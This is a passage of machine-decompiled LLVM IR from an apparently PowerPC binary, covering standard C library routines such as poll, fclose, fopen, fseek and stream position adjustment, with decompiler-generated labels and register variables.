  uselistorder i1* @cr0_so, { 3, 0, 7, 8, 9, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1001253c, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10012568 = call i32 @__asm_mfcr()
  %v1_1001256c = and i32 %v0_10012568, 268435456
  %v3_1001256c = icmp eq i32 %v1_1001256c, 0
  store i32 %v0_10012568, i32* %r31.global-to-local, align 4
  br i1 %v3_1001256c, label %dec_label_pc_10012584, label %dec_label_pc_10012578

dec_label_pc_10012578:                            ; preds = %entry
  %v0_10012578 = call i32 @__errno_location()
  %v0_1001257c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001257c = inttoptr i32 %v0_10012578 to i32*
  store i32 %v0_1001257c, i32* %v2_1001257c, align 4
  br label %dec_label_pc_10012584

dec_label_pc_10012584:                            ; preds = %entry, %dec_label_pc_10012578
  %v0_10012594 = phi i32 [ %v0_10012568, %entry ], [ -1, %dec_label_pc_10012578 ]
  ret i32 %v0_10012594

; uselistorder directives
  uselistorder label %dec_label_pc_10012584, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100125ac = add i32 %tmp, 52
  %v3_100125ac = inttoptr i32 %v2_100125ac to i32*
  %v4_100125ac = load i32, i32* %v3_100125ac, align 4
  store i32 %v4_100125ac, i32* @r28, align 4
  %v3_100125b0 = icmp eq i32 %v4_100125ac, 0
  store i1 %v3_100125b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100125b0, label %dec_label_pc_100125b8, label %dec_label_pc_100125d8

dec_label_pc_100125b8:                            ; preds = %entry
  %v2_100125c0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100125c0, i32* @r3, align 4
  %v0_100125cc = call i32 @__pthread_return_void()
  %v0_100125d4 = call i32 @__pthread_return_0()
  %v0_100125d8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100125d8

dec_label_pc_100125d8:                            ; preds = %entry, %dec_label_pc_100125b8
  %v0_100125e8 = phi i32 [ %tmp, %entry ], [ %v0_100125d8.pre, %dec_label_pc_100125b8 ]
  %v1_100125d8 = inttoptr i32 %v0_100125e8 to i16*
  %v2_100125d8 = load i16, i16* %v1_100125d8, align 2
  %v3_100125d8 = zext i16 %v2_100125d8 to i32
  store i32 0, i32* @r27, align 4
  %v1_100125e0 = and i32 %v3_100125d8, 64
  %v3_100125e0 = icmp eq i32 %v1_100125e0, 0
  br i1 %v3_100125e0, label %dec_label_pc_100125f4, label %dec_label_pc_100125e8

dec_label_pc_100125e8:                            ; preds = %dec_label_pc_100125d8
  store i32 268510704, i32* @lr, align 4
  %v4_100125ec = call i32 @fflush_unlocked(i16* %v1_100125d8, i32 %v1_100125e0)
  store i32 %v4_100125ec, i32* @r27, align 4
  %v0_100125f4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100125f4

dec_label_pc_100125f4:                            ; preds = %dec_label_pc_100125d8, %dec_label_pc_100125e8
  %v0_100125f4 = phi i32 [ %v0_100125e8, %dec_label_pc_100125d8 ], [ %v0_100125f4.pre, %dec_label_pc_100125e8 ]
  %v1_100125f4 = add i32 %v0_100125f4, 4
  %v2_100125f4 = inttoptr i32 %v1_100125f4 to i32*
  %v3_100125f4 = load i32, i32* %v2_100125f4, align 4
  store i32 268510716, i32* @lr, align 4
  %v1_100125f8 = call i32 @__libc_close(i32 %v3_100125f4)
  %v3_100125fc = icmp eq i32 %v1_100125f8, 0
  store i1 %v3_100125fc, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_100125f8, -1
  br i1 %tmp8, label %dec_label_pc_10012608, label %dec_label_pc_10012604

dec_label_pc_10012604:                            ; preds = %dec_label_pc_100125f4
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10012608

dec_label_pc_10012608:                            ; preds = %dec_label_pc_100125f4, %dec_label_pc_10012604
  store i32 ptrtoint ([3 x i8]* @global_var_10010048.752 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_1002b58c.713 to i32), i32* @r29, align 4
  %v1_1001261c = load i32, i32* @r31, align 4
  %v2_1001261c = add i32 %v1_1001261c, 4
  %v3_1001261c = inttoptr i32 %v2_1001261c to i32*
  store i32 -1, i32* %v3_1001261c, align 4
  %v2_10012620 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012620, i32* @r30, align 4
  store i32 %v2_10012620, i32* @r3, align 4
  %v0_10012630 = call i32 @__pthread_return_void()
  %v0_10012638 = call i32 @__pthread_return_0()
  %v3_10012640 = load i32, i32* @global_var_1002b930.832, align 4
  store i32 %v2_10012620, i32* @r3, align 4
  %v1_1001264c = add i32 %v3_10012640, 1
  store i32 %v1_1001264c, i32* @global_var_1002b930.832, align 4
  %v0_10012654 = call i32 @__pthread_return_void()
  %v0_10012658 = load i32, i32* @r31, align 4
  %v1_10012658 = inttoptr i32 %v0_10012658 to i16*
  %v2_10012658 = load i16, i16* %v1_10012658, align 2
  %v3_10012658 = zext i16 %v2_10012658 to i32
  %v0_1001265c = load i32, i32* @r28, align 4
  %v3_1001265c = icmp eq i32 %v0_1001265c, 0
  store i1 %v3_1001265c, i1* %cr7_eq.global-to-local, align 1
  %v1_10012660 = call i32 @__asm_rlwinm(i32 %v3_10012658, i32 0, i32 17, i32 18)
  %v1_10012668 = or i32 %v1_10012660, 48
  %v1_1001266c = trunc i32 %v1_10012668 to i16
  %v2_1001266c = load i32, i32* @r31, align 4
  %v3_1001266c = inttoptr i32 %v2_1001266c to i16*
  store i16 %v1_1001266c, i16* %v3_1001266c, align 2
  %v0_10012670 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10012670, label %dec_label_pc_10012674, label %dec_label_pc_10012680

dec_label_pc_10012674:                            ; preds = %dec_label_pc_10012608
  %v2_10012674 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10012674, i32* @r3, align 4
  %v0_1001267c = call i32 @__pthread_return_void()
  br label %dec_label_pc_10012680

dec_label_pc_10012680:                            ; preds = %dec_label_pc_10012608, %dec_label_pc_10012674
  %v0_10012680 = load i32, i32* @r31, align 4
  %v1_10012680 = inttoptr i32 %v0_10012680 to i16*
  %v2_10012680 = load i16, i16* %v1_10012680, align 2
  %v1_10012684 = and i16 %v2_10012680, 16384
  %v3_10012684 = icmp eq i16 %v1_10012684, 0
  br i1 %v3_10012684, label %dec_label_pc_10012694, label %dec_label_pc_1001268c

dec_label_pc_1001268c:                            ; preds = %dec_label_pc_10012680
  %v1_1001268c = add i32 %v0_10012680, 8
  %v2_1001268c = inttoptr i32 %v1_1001268c to i32*
  %v3_1001268c = load i32, i32* %v2_1001268c, align 4
  store i32 268510868, i32* @lr, align 4
  %v1_10012690 = call i32 @free(i32 %v3_1001268c)
  br label %dec_label_pc_10012694

dec_label_pc_10012694:                            ; preds = %dec_label_pc_10012680, %dec_label_pc_1001268c
  store i32 %v2_10012620, i32* @r3, align 4
  %v0_100126a0 = call i32 @__pthread_return_void()
  %v0_100126a8 = call i32 @__pthread_return_0()
  %v3_100126b0 = load i16*, i16** @global_var_1002b934.833, align 4
  %v4_100126b0 = ptrtoint i16* %v3_100126b0 to i32
  store i32 %v2_10012620, i32* @r3, align 4
  %v1_100126bc = add i32 %v4_100126b0, 1
  %v4_100126c0 = inttoptr i32 %v1_100126bc to i16*
  store i16* %v4_100126c0, i16** @global_var_1002b934.833, align 4
  %v0_100126c4 = call i32 @__pthread_return_void()
  store i32 268510924, i32* @lr, align 4
  %v0_100126c8 = call i32 @_stdio_openlist_dec_use()
  %v0_100126d0 = load i32, i32* @r27, align 4
  ret i32 %v0_100126d0

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 17, { 16, 0, 1, 13, 2, 9, 10, 3, 11, 4, 5, 6, 7, 8, 17, 18, 14, 15, 12 }
  uselistorder i32 (i32)* @__libc_close, { 4, 3, 2, 1, 23, 22, 21, 20, 19, 18, 17, 0, 16, 15, 14, 12, 11, 10, 9, 8, 7, 6, 5, 13 }
  uselistorder label %dec_label_pc_10012694, { 1, 0 }
  uselistorder label %dec_label_pc_10012680, { 1, 0 }
  uselistorder label %dec_label_pc_10012608, { 1, 0 }
  uselistorder label %dec_label_pc_100125f4, { 1, 0 }
  uselistorder label %dec_label_pc_100125d8, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_100126ec = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_100126ec
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100126f0 = load i32, i32* @r5, align 4
  store i32 %v0_100126f0, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_100126f8 = zext i1 %tmp to i32
  %v2_100126f8 = ashr i32 %arg1, 31
  %v3_100126f8 = and i32 %v2_100126f8, -2
  %v4_100126f8 = or i32 %v3_100126f8, %v1_100126f8
  %v3_100126fc = inttoptr i32 %v4_100126f8 to i16*
  %v4_100126fc = call i32 @__GI_fseeko64(i16* %v3_100126fc, i32 %arg1, i32 %v0_100126f0)
  ret i32 %v4_100126fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10012700 = load i32, i32* @r7, align 4
  %v0_10012704 = load i32, i32* @lr, align 4
  store i32 %v0_10012704, i32* %r0.global-to-local, align 4
  store i32 %v0_10012700, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10012700, 3
  br i1 %tmp9, label %dec_label_pc_1001273c, label %dec_label_pc_10012728

dec_label_pc_10012728:                            ; preds = %entry
  %v0_10012728 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10012734 = inttoptr i32 %v0_10012728 to i32*
  store i32 22, i32* %v2_10012734, align 4
  br label %dec_label_pc_10012804

dec_label_pc_1001273c:                            ; preds = %entry
  %v2_1001273c = add i32 %tmp, 52
  %v3_1001273c = inttoptr i32 %v2_1001273c to i32*
  %v4_1001273c = load i32, i32* %v3_1001273c, align 4
  store i32 %v4_1001273c, i32* @r28, align 4
  %v3_10012740 = icmp eq i32 %v4_1001273c, 0
  br i1 %v3_10012740, label %dec_label_pc_10012748, label %dec_label_pc_10012768

dec_label_pc_10012748:                            ; preds = %dec_label_pc_1001273c
  %v2_10012748 = add i32 %tmp, 56
  store i32 %v2_10012748, i32* @r29, align 4
  %v2_10012750 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10012750, i32* @r3, align 4
  %v0_1001275c = call i32 @__pthread_return_void()
  %v0_10012764 = call i32 @__pthread_return_0()
  %v0_10012768.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012768

dec_label_pc_10012768:                            ; preds = %dec_label_pc_1001273c, %dec_label_pc_10012748
  %v0_10012774 = phi i32 [ %tmp, %dec_label_pc_1001273c ], [ %v0_10012768.pre, %dec_label_pc_10012748 ]
  %v1_10012768 = inttoptr i32 %v0_10012774 to i16*
  %v2_10012768 = load i16, i16* %v1_10012768, align 2
  %v3_10012768 = zext i16 %v2_10012768 to i32
  store i32 %v3_10012768, i32* %r0.global-to-local, align 4
  %v1_1001276c = and i32 %v3_10012768, 64
  store i32 %v1_1001276c, i32* %r9.global-to-local, align 4
  %v3_1001276c = icmp eq i32 %v1_1001276c, 0
  br i1 %v3_1001276c, label %dec_label_pc_10012784, label %dec_label_pc_10012774

dec_label_pc_10012774:                            ; preds = %dec_label_pc_10012768
  store i32 %v0_10012774, i32* @r3, align 4
  store i32 268511100, i32* @lr, align 4
  %v0_10012778 = call i32 @__stdio_wcommit()
  %v3_1001277c = icmp eq i32 %v0_10012778, 0
  br i1 %v3_1001277c, label %dec_label_pc_10012784, label %dec_label_pc_100127ec

dec_label_pc_10012784:                            ; preds = %dec_label_pc_10012774, %dec_label_pc_10012768
  %v0_10012784 = load i32, i32* @r30, align 4
  %v3_10012784 = icmp eq i32 %v0_10012784, 1
  br i1 %v3_10012784, label %dec_label_pc_1001278c, label %dec_label_pc_10012784.dec_label_pc_100127a0_crit_edge

dec_label_pc_10012784.dec_label_pc_100127a0_crit_edge: ; preds = %dec_label_pc_10012784
  br label %dec_label_pc_100127a0

dec_label_pc_1001278c:                            ; preds = %dec_label_pc_10012784
  %v0_1001278c = load i32, i32* @r31, align 4
  %v1_1001278c = inttoptr i32 %v0_1001278c to i16*
  %v2_10012790 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268511128, i32* @lr, align 4
  %v4_10012794 = call i32 @__stdio_adjust_position(i16* %v1_1001278c, i32 %v2_10012790)
  %v1_10012798 = icmp slt i32 %v4_10012794, 0
  br i1 %v1_10012798, label %dec_label_pc_100127ec, label %dec_label_pc_1001278c.dec_label_pc_100127a0_crit_edge

dec_label_pc_1001278c.dec_label_pc_100127a0_crit_edge: ; preds = %dec_label_pc_1001278c
  %v0_100127a0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100127a0

dec_label_pc_100127a0:                            ; preds = %dec_label_pc_10012784.dec_label_pc_100127a0_crit_edge, %dec_label_pc_1001278c.dec_label_pc_100127a0_crit_edge
  %v0_100127a0 = phi i32 [ %v0_10012784, %dec_label_pc_10012784.dec_label_pc_100127a0_crit_edge ], [ %v0_100127a0.pre, %dec_label_pc_1001278c.dec_label_pc_100127a0_crit_edge ]
  %v0_100127a4 = load i32, i32* @r31, align 4
  store i32 268511152, i32* @lr, align 4
  %v5_100127ac = call i32 @__stdio_seek(i32 %v0_100127a4, i32* nonnull %stack_var_-56, i32 %v0_100127a0)
  %v1_100127b0 = icmp slt i32 %v5_100127ac, 0
  br i1 %v1_100127b0, label %dec_label_pc_100127ec, label %dec_label_pc_100127b8

dec_label_pc_100127b8:                            ; preds = %dec_label_pc_100127a0
  %v0_100127b8 = load i32, i32* @r31, align 4
  %v1_100127b8 = inttoptr i32 %v0_100127b8 to i16*
  %v2_100127b8 = load i16, i16* %v1_100127b8, align 2
  %v3_100127b8 = zext i16 %v2_100127b8 to i32
  store i32 %v3_100127b8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100127c0 = add i32 %v0_100127b8, 8
  %v2_100127c0 = inttoptr i32 %v1_100127c0 to i32*
  %v3_100127c0 = load i32, i32* %v2_100127c0, align 4
  store i32 %v3_100127c0, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_100127c8 = and i32 %v3_100127b8, 65464
  store i32 %v1_100127c8, i32* %r0.global-to-local, align 4
  %v3_100127cc = add i32 %v0_100127b8, 2
  %v4_100127cc = inttoptr i32 %v3_100127cc to i8*
  store i8 0, i8* %v4_100127cc, align 1
  %v0_100127d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100127d0 = load i32, i32* @r31, align 4
  %v2_100127d0 = add i32 %v1_100127d0, 28
  %v3_100127d0 = inttoptr i32 %v2_100127d0 to i32*
  store i32 %v0_100127d0, i32* %v3_100127d0, align 4
  %v0_100127d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100127d4 = trunc i32 %v0_100127d4 to i16
  %v2_100127d4 = load i32, i32* @r31, align 4
  %v3_100127d4 = inttoptr i32 %v2_100127d4 to i16*
  store i16 %v1_100127d4, i16* %v3_100127d4, align 2
  %v0_100127d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100127d8 = load i32, i32* @r31, align 4
  %v2_100127d8 = add i32 %v1_100127d8, 16
  %v3_100127d8 = inttoptr i32 %v2_100127d8 to i32*
  store i32 %v0_100127d8, i32* %v3_100127d8, align 4
  %v0_100127dc = load i32, i32* %r9.global-to-local, align 4
  %v1_100127dc = load i32, i32* @r31, align 4
  %v2_100127dc = add i32 %v1_100127dc, 20
  %v3_100127dc = inttoptr i32 %v2_100127dc to i32*
  store i32 %v0_100127dc, i32* %v3_100127dc, align 4
  %v0_100127e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100127e0 = load i32, i32* @r31, align 4
  %v2_100127e0 = add i32 %v1_100127e0, 24
  %v3_100127e0 = inttoptr i32 %v2_100127e0 to i32*
  store i32 %v0_100127e0, i32* %v3_100127e0, align 4
  %v0_100127e4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100127e4 = load i32, i32* @r31, align 4
  %v2_100127e4 = add i32 %v1_100127e4, 44
  %v3_100127e4 = inttoptr i32 %v2_100127e4 to i32*
  store i32 %v0_100127e4, i32* %v3_100127e4, align 4
  br label %dec_label_pc_100127f0

dec_label_pc_100127ec:                            ; preds = %dec_label_pc_10012774, %dec_label_pc_100127a0, %dec_label_pc_1001278c
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_100127f0

dec_label_pc_100127f0:                            ; preds = %dec_label_pc_100127b8, %dec_label_pc_100127ec
  %v0_100127f0 = load i32, i32* @r28, align 4
  %v3_100127f0 = icmp eq i32 %v0_100127f0, 0
  br i1 %v3_100127f0, label %dec_label_pc_100127f8, label %dec_label_pc_10012804

dec_label_pc_100127f8:                            ; preds = %dec_label_pc_100127f0
  %v2_100127f8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100127f8, i32* @r3, align 4
  %v0_10012800 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10012804

dec_label_pc_10012804:                            ; preds = %dec_label_pc_100127f0, %dec_label_pc_10012728, %dec_label_pc_100127f8
  store i32 %v0_10012704, i32* %r0.global-to-local, align 4
  %v0_10012808 = load i32, i32* @r30, align 4
  ret i32 %v0_10012808

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100127f0, { 1, 0 }
  uselistorder label %dec_label_pc_100127ec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100127a0, { 1, 0 }
  uselistorder label %dec_label_pc_10012768, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_10012834 = load i16, i16* %arg1, align 2
  %v4_10012834 = zext i16 %v3_10012834 to i32
  %tmp9 = urem i16 %v3_10012834, 4
  %v3_10012838 = icmp eq i16 %tmp9, 0
  br i1 %v3_10012838, label %dec_label_pc_10012884, label %dec_label_pc_10012840

dec_label_pc_10012840:                            ; preds = %entry
  %v1_10012838 = zext i16 %tmp9 to i32
  %v1_10012840 = add nsw i32 %v1_10012838, -1
  store i32 %v1_10012840, i32* %r10.global-to-local, align 4
  %v4_10012840 = icmp eq i32 %v1_10012840, 0
  br i1 %v4_10012840, label %dec_label_pc_10012884, label %dec_label_pc_10012848

dec_label_pc_10012848:                            ; preds = %dec_label_pc_10012840
  %v1_10012848 = and i32 %v4_10012834, 2048
  %v3_10012848 = icmp eq i32 %v1_10012848, 0
  br i1 %v3_10012848, label %dec_label_pc_10012884, label %dec_label_pc_10012850

dec_label_pc_10012850:                            ; preds = %dec_label_pc_10012848
  %v2_10012850 = icmp sgt i32 %v1_10012840, 1
  br i1 %v2_10012850, label %dec_label_pc_100128fc, label %dec_label_pc_10012858

dec_label_pc_10012858:                            ; preds = %dec_label_pc_10012850
  %v2_10012858 = add i32 %tmp, 40
  %v3_10012858 = inttoptr i32 %v2_10012858 to i32*
  %v4_10012858 = load i32, i32* %v3_10012858, align 4
  %v3_1001285c = icmp eq i32 %v4_10012858, 0
  br i1 %v3_1001285c, label %dec_label_pc_10012864, label %dec_label_pc_100128fc

dec_label_pc_10012864:                            ; preds = %dec_label_pc_10012858
  %v2_10012864 = add i32 %tmp, 44
  %v3_10012864 = inttoptr i32 %v2_10012864 to i32*
  %v4_10012864 = load i32, i32* %v3_10012864, align 4
  %v2_10012868 = add i32 %tmp, 3
  %v3_10012868 = inttoptr i32 %v2_10012868 to i8*
  %v4_10012868 = load i8, i8* %v3_10012868, align 1
  %v5_10012868 = zext i8 %v4_10012868 to i32
  %v2_10012870 = sub nsw i32 %v1_10012840, %v5_10012868
  %v1_10012874 = add nsw i32 %v2_10012870, -1
  store i32 %v1_10012874, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_10012864, 1
  br i1 %tmp7, label %dec_label_pc_10012884, label %dec_label_pc_1001287c

dec_label_pc_1001287c:                            ; preds = %dec_label_pc_10012864
  %v2_1001287c = add i32 %tmp, 2
  %v3_1001287c = inttoptr i32 %v2_1001287c to i8*
  %v4_1001287c = load i8, i8* %v3_1001287c, align 1
  %v5_1001287c = zext i8 %v4_1001287c to i32
  %v2_10012880 = sub nsw i32 %v1_10012874, %v5_1001287c
  store i32 %v2_10012880, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012884

dec_label_pc_10012884:                            ; preds = %dec_label_pc_10012864, %dec_label_pc_10012848, %dec_label_pc_10012840, %entry, %dec_label_pc_1001287c
  %v0_100128a8 = phi i32 [ %v1_10012874, %dec_label_pc_10012864 ], [ %v1_10012840, %dec_label_pc_10012848 ], [ 0, %dec_label_pc_10012840 ], [ 0, %entry ], [ %v2_10012880, %dec_label_pc_1001287c ]
  %v1_10012884 = and i32 %v4_10012834, 64
  %v3_10012884 = icmp eq i32 %v1_10012884, 0
  %storemerge.in.in.v = select i1 %v3_10012884, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10012898 = add i32 %tmp, 16
  %v3_10012898 = inttoptr i32 %v2_10012898 to i32*
  %v4_10012898 = load i32, i32* %v3_10012898, align 4
  %v1_1001289c = inttoptr i32 %arg2 to i32*
  %v2_1001289c = load i32, i32* %v1_1001289c, align 4
  store i32 %v2_1001289c, i32* %r4.global-to-local, align 4
  %v2_100128a0 = sub i32 %storemerge, %v4_10012898
  %v1_100128a4 = add i32 %arg2, 4
  %v2_100128a4 = inttoptr i32 %v1_100128a4 to i32*
  %v3_100128a4 = load i32, i32* %v2_100128a4, align 4
  store i32 %v3_100128a4, i32* %r5.global-to-local, align 4
  %v2_100128a8 = add i32 %v2_100128a0, %v0_100128a8
  store i32 %v2_100128a8, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_100128a8, 0
  %v1_100128b0 = zext i1 %tmp10 to i32
  %v2_100128b0 = ashr i32 %v2_100128a8, 31
  %v3_100128b0 = and i32 %v2_100128b0, -2
  %v4_100128b0 = or i32 %v3_100128b0, %v1_100128b0
  %v2_100128b4 = sub i32 %v3_100128a4, %v2_100128a8
  %v3_100128b4 = sub i32 -1, %v2_100128a8
  store i32 %v2_100128b4, i32* %r10.global-to-local, align 4
  %v6_100128b4 = icmp ule i32 %v2_100128b4, %v3_100128b4
  %v2_100128b8 = sub nsw i32 -1, %v4_100128b0
  %v3_100128b8 = add i32 %v2_1001289c, %v2_100128b8
  %v5_100128b8 = zext i1 %v6_100128b4 to i32
  %v6_100128b8 = add i32 %v3_100128b8, %v5_100128b8
  store i32 %v6_100128b8, i32* %v1_1001289c, align 4
  %v0_100128c0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100128c0 = load i32, i32* @r8, align 4
  %v2_100128c0 = add i32 %v1_100128c0, 4
  %v3_100128c0 = inttoptr i32 %v2_100128c0 to i32*
  store i32 %v0_100128c0, i32* %v3_100128c0, align 4
  %v0_100128c4 = load i32, i32* @r8, align 4
  %v1_100128c4 = inttoptr i32 %v0_100128c4 to i32*
  %v2_100128c4 = load i32, i32* %v1_100128c4, align 4
  %v1_100128c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_100128c8 = icmp sgt i32 %v2_100128c4, %v1_100128c8
  br i1 %v3_100128c8, label %dec_label_pc_100128e0, label %dec_label_pc_100128d0

dec_label_pc_100128d0:                            ; preds = %dec_label_pc_10012884
  %v4_100128c8 = icmp eq i32 %v2_100128c4, %v1_100128c8
  br i1 %v4_100128c8, label %dec_label_pc_100128d4, label %dec_label_pc_100128e4thread-pre-split

dec_label_pc_100128d4:                            ; preds = %dec_label_pc_100128d0
  %v1_100128d4 = add i32 %v0_100128c4, 4
  %v2_100128d4 = inttoptr i32 %v1_100128d4 to i32*
  %v3_100128d4 = load i32, i32* %v2_100128d4, align 4
  %v1_100128d8 = load i32, i32* %r5.global-to-local, align 4
  %v3_100128d8 = icmp ugt i32 %v3_100128d4, %v1_100128d8
  br i1 %v3_100128d8, label %dec_label_pc_100128e0, label %dec_label_pc_100128e4thread-pre-split

dec_label_pc_100128e0:                            ; preds = %dec_label_pc_100128d4, %dec_label_pc_10012884
  %v0_100128e0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100128e0 = sub i32 0, %v0_100128e0
  store i32 %v1_100128e0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100128e4

dec_label_pc_100128e4thread-pre-split:            ; preds = %dec_label_pc_100128d0, %dec_label_pc_100128d4
  %v0_100128e4.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100128e4

dec_label_pc_100128e4:                            ; preds = %dec_label_pc_100128e4thread-pre-split, %dec_label_pc_100128e0
  %v0_100128e4 = phi i32 [ %v0_100128e4.pr, %dec_label_pc_100128e4thread-pre-split ], [ %v1_100128e0, %dec_label_pc_100128e0 ]
  %tmp8 = icmp sgt i32 %v0_100128e4, -1
  br i1 %tmp8, label %dec_label_pc_10012900, label %dec_label_pc_100128ec

dec_label_pc_100128ec:                            ; preds = %dec_label_pc_100128e4
  %v0_100128ec = call i32 @__errno_location()
  %v2_100128f4 = inttoptr i32 %v0_100128ec to i32*
  store i32 75, i32* %v2_100128f4, align 4
  %v0_10012904.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10012900

dec_label_pc_100128fc:                            ; preds = %dec_label_pc_10012858, %dec_label_pc_10012850
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10012900

dec_label_pc_10012900:                            ; preds = %dec_label_pc_100128e4, %dec_label_pc_100128ec, %dec_label_pc_100128fc
  %v0_10012904 = phi i32 [ %v0_100128e4, %dec_label_pc_100128e4 ], [ %v0_10012904.pre, %dec_label_pc_100128ec ], [ -1, %dec_label_pc_100128fc ]
  ret i32 %v0_10012904

; uselistorder directives
  uselistorder i32 %v2_100128c4, { 1, 0 }
  uselistorder i32 %v2_100128a8, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 2048, { 2, 3, 4, 5, 0, 1 }
  uselistorder label %dec_label_pc_10012900, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100128e4thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10012884, { 4, 0, 1, 2, 3 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10012918 = load i32, i32* @lr, align 4
  store i32 %v0_10012918, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_1001292c = load i32, i32* @r5, align 4
  store i32 %v0_1001292c, i32* @r31, align 4
  %v0_10012930 = load i32, i32* @r6, align 4
  store i32 %v0_10012930, i32* @r29, align 4
  %v3_10012934 = load i8, i8* %arg2, align 1
  %v4_10012934 = zext i8 %v3_10012934 to i32
  store i32 %v4_10012934, i32* %r0.global-to-local, align 4
  %v3_10012938 = icmp eq i8 %v3_10012934, 114
  br i1 %v3_10012938, label %dec_label_pc_10012984, label %dec_label_pc_10012940

dec_label_pc_10012940:                            ; preds = %entry
  %v3_10012940 = icmp eq i8 %v3_10012934, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10012940, label %dec_label_pc_10012988, label %dec_label_pc_1001294c

dec_label_pc_1001294c:                            ; preds = %dec_label_pc_10012940
  %v3_1001294c = icmp eq i8 %v3_10012934, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_1001294c, label %dec_label_pc_10012988, label %dec_label_pc_10012958

